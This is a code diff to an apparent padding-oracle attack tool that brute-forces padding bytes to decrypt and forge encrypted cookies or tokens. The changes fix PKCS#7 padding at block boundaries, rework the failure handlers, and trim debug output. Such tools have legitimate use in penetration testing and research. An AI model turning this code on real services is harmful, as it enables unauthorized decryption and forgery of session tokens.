@@ -88,17 +88,23 @@ def saveState(job):
 def paddify(string,blocksize):
     groups_storage = []
     groups = list(split_by_n(string,blocksize))
-    for group in groups:
-        if len(group) == blocksize:
+    for idx,group in enumerate(groups):
+
+        # if its not the last block, just append
+        if (idx + 1) < len(groups):
             groups_storage.append(str(group))
         else:
             temp_group = str(group[:])
             padding_length = blocksize - len(group)
+            # if we fall right on a block boundary, we need a full block of padding
+            if padding_length == 0:
+                padding_length = blocksize
             for i in range(0,padding_length):
                 temp_group = temp_group + chr(padding_length)
             groups_storage.append(temp_group)
     paddedstring = ''.join(groups_storage)
     return paddedstring
+
     
     
 # The job object holds the state for the encrypt/decrypt operation and contains the majority of the cryptographic code
@@ -268,34 +274,17 @@ class Job:
         print(tempToken)
         print('*************************************************\n')
           
-    def encryptBlockFail(self):
-        print('placeholder')    
-        sys.exit(2)
+    def encryptBlockFail(self,padding_array,tempTokenBytes):
+        self.decryptBlockFail(padding_array,tempTokenBytes)
+        
     
     def decryptBlockFail(self,padding_array,tempTokenBytes):
 
-        if encodingMode == 'base64':
-            tempToken = urllib.parse.quote_plus(bytes_to_base64(tempTokenBytes)) #re-base64 that string
-
-        if encodingMode == 'base64Url':
-            tempToken = bytes_to_base64(bytes(tempTokenBytes)).encode().replace('=','').replace("+","-").replace('/','_')
-
-        if encodingMode == 'hex':
-            tempToken = tempTokenBytes.hex().upper()
-
         writeToLog('No characters produced valid padding. For the current block aborting')
         print('\n[!]ERROR! No characters produced valid padding! This must mean there was previously an irrecoverable error!')
-        print('[!]DEBUG INFO:')
-        print('[*]THIS IS THE PADDING ARRAY')
-        print('*************************************************')
-        print(padding_array)
         print('*************************************************\n')
-        print('[*]This is what the cookie would look like')
-        print('*************************************************')
-        print(tempToken)
-        print(urllib.parse.quote_plus(tempToken))
-        print('*************************************************\n')
-        sys.exit(2)
+        raise Exception("Block failed to decrypt/encrypt, likely a random network error.")
+        #sys.exit(2)
     
     def encryptBlock(self):
         print(f'[!]Starting Analysis for block number: {self.currentBlock + 1} OF {self.blockCount}\n')
@@ -326,7 +315,7 @@ class Job:
             solved = False
             while solved == False:
                 if count > 255:
-                    self.encryptBlockFail()
+                    self.encryptBlockFail(padding_array,tempTokenBytes)
                 padding_array[currentbyte] = count #keep changing the same byte in the previous block
 
                 for k,v in solved_intermediates.items(): #populate the previous bytes with the correct values based on the changing padding but constant intermediates
@@ -511,7 +500,7 @@ class Job:
             joinedCrypto = b''.join([joinedCrypto,bytes([0] * job.blocksize)])
             
             if encodingMode == 'base64':
-                encryptTemp = b64urlEncode(urllib.parse.quote_plus(bytes_to_base64(joinedCrypto)))
+                encryptTemp = b64urlEncode(urllib.parse.quote_plus(bytes_to_base64(joinedCrypto)))#
 
             if encodingMode == "base64Url":
                 encryptTemp = bytes_to_base64(joinedCrypto).decode().replace('=','').replace("+","-").replace('/','_')
